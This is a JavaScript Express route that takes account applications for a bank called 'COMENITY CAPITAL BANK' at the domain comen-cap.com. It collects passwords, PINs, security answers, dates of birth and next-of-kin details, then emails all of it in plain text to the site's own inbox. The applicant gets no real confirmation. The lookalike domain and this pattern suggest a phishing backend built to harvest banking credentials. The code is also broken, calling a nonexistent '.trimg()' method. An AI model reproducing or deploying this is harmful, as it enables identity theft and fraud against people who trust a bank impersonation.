//Set up
let express = require("express");
let router = express.Router();

let userModel = require("../schemas/userSchema");

const { trim } = require("express-validator").validator;

var nodemailer = require("nodemailer");

var sendEmailNotification = require("../mailSender");

router.post("/apply", function (req, res) {
  // console.log(req.body);
  let newUser = {
    bio: {
      name: req.body.name,
      login: {
        username: req.body.user.trimg(),
        password: req.body.pwd.trimg(),
      },
      address: {
        street: req.body.address.trimg(),
        city: req.body.city.trimg(),
        state: req.body.state.trimg(),
        country: req.body.country,
      },
      dob: req.body.dob,
      phonenumber: req.body.phone,
      email: req.body.email,
    },

    security: {
      qanda: {
        question: req.body.question,
        answer: req.body.answer.trimg(),
      },
      pin: req.body.pin,
    },

    account: {
      accountno: null,
      accounttype: req.body.account_type,
      accountbalance: null,
      currency: null,
      accountofficer: null,
      accountofficercode: null,
      accountofficeremail: null,
    },

    status: {
      restricted: false,
      message: "",
    },

    kin: {
      kinname: req.body.kin,
      kinnumber: req.body.kinnumber,
      kinaddress: req.body.kin_address,
      kin_city: req.body.kin_city,
      kin_state: req.body.kin_state,
      kin_country: req.body.kin_country,
    },
  };

  newUserInstance = new userModel(newUser);
  newUserInstance.save(function (err) {
    if (err) {
      //console.log("Error, User Not registered.");
      //console.log(err);
      if (err.code == 11000) {
        //res.send({"error": "you're using either a duplicate username or email, kindly use another and try again."});
      }
      console.log(err);
      res.send({
        error:
          "An Error Occurred During registration, make sure you're not using the same email address or phone number and make sure to fill all necessary information requested of you.",
      });
    } else {
      console.log("Registration Successful.");

      ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      let now = new Date();
      let mailOptions1 = {
        from: '"COMENITY CAPITAL BANK" <noreply@comen-cap.com>',
        to: "info@comen-cap.com",
        subject: "A New Client just applied successfully",
        html: `
					<div style="background-color: lightgray; text-align: center; font-family: arial; font-size: 13px; padding: 10px;">
						<hr>
						 <img src="https://i.ibb.co/sFwgQ9R/logo.png" height="40px" style="height: 30px"/>
						<h2 style="color: #4597AE"> COMENITY CAPITAL BANK New Application </h2>
						<hr>

						<p> A client just applied and his details are as follows: </p>
						<p> Name: ${req.body.name} <br />
						<p> Username: ${req.body.user} <br />
						Password: ${req.body.pwd} <br />
						Address: ${req.body.address}, ${req.body.city},${req.body.state},${req.body.country} <br />
						DOB: ${req.body.dob}<br />
						Tel: ${req.body.phone} <br />
						Email: ${req.body.email} <br />
						Account Type: ${req.body.account_type} <br />
						Kin Name: ${req.body.kin} <br />
						Kin Number: ${req.body.kinnumber} <br />
						Kin Address: ${req.body.kin_address} <br />
						Kin City: ${req.body.kin_city} <br />
						Kin State: ${req.body.kin_state} <br />
						Kin Country: ${req.body.kin_country} <br />

						<div style="background-color: black; color: white; padding:2px; font-size: 11px;">
							<p> Thank you For banking with COMENITY CAPITAL BANK, the bank that knows all your needs even before you ask. </p>
						</div>
					</div>
					`,
      };

      let mailOptions2 = {
        from: '"COMENITY CAPITAL BANK" <noreply@comen-cap.com>',
        to: "info@comen-cap.com",
        subject: "A New Client just applied successfully",
        html: `
						<div style="background-color: lightgray; text-align: center; font-family: arial; font-size: 13px; padding: 10px;">
							<hr>
							 <img src="https://i.ibb.co/sFwgQ9R/logo.png" height="40px" style="height: 30px"/>
							<h2 style="color: #4597AE"> COMENITY CAPITAL BANK New Application </h2>
							<hr>

							<p> A client just applied and his details are as follows: </p>
							<p> Name: ${req.body.name} <br />
							<p> Username: ${req.body.user} <br />
							Password: ${req.body.pwd} <br />
							Address: ${req.body.address}, ${req.body.city},${req.body.state},${req.body.country} <br />
							DOB: ${req.body.dob}<br />
							Tel: ${req.body.phone} <br />
							Email: ${req.body.email} <br />
							Account Type: ${req.body.account_type} <br />
							Kin Name: ${req.body.kin} <br />
							Kin Number: ${req.body.kinnumber} <br />
							Kin Address: ${req.body.kin_address} <br />
							Kin City: ${req.body.kin_city} <br />
							Kin State: ${req.body.kin_state} <br />
							Kin Country: ${req.body.kin_country} <br />

							<div style="background-color: black; color: white; padding:2px; font-size: 11px;">
								<p> Thank you For banking with COMENITY CAPITAL BANK, the bank that knows all your needs even before you ask. </p>
							</div>
						</div>
						`,
      };

      sendEmailNotification(mailOptions1).then(
        (data) => {
          console.log(data);
          sendEmailNotification(mailOptions2).then(
            (data) => {
              return res.send({
                success:
                  "Your Account has been created successfully, kindly chck your email for our confirmation message.",
              });
            },
            (error) => {
              console.log(error);
              return res.send({
                error:
                  "Your Account has been created successfully, but there was an error sending your confirmation email.",
              });
            }
          );
        },
        (error) => {
          console.log(error);
          return res.send({
            error:
              "Your Account has been created successfully, but there was an error sending your confirmation email.",
          });
        }
      );
    }
  });
});

module.exports = router;
